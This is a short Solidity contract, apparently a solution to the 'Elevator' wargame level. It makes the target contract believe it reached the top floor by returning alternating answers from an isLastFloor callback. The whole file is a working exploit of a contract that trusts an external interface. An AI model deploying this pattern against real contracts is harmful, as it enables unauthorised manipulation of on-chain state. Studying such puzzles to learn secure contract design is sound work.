// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    bool public _isLastFloor = true;

    function isLastFloor(uint256) external returns (bool) {
        _isLastFloor = !_isLastFloor;
        return _isLastFloor;
    }

    function attack(address _target) external {
        IElevator(_target).goTo(0);
    }
}
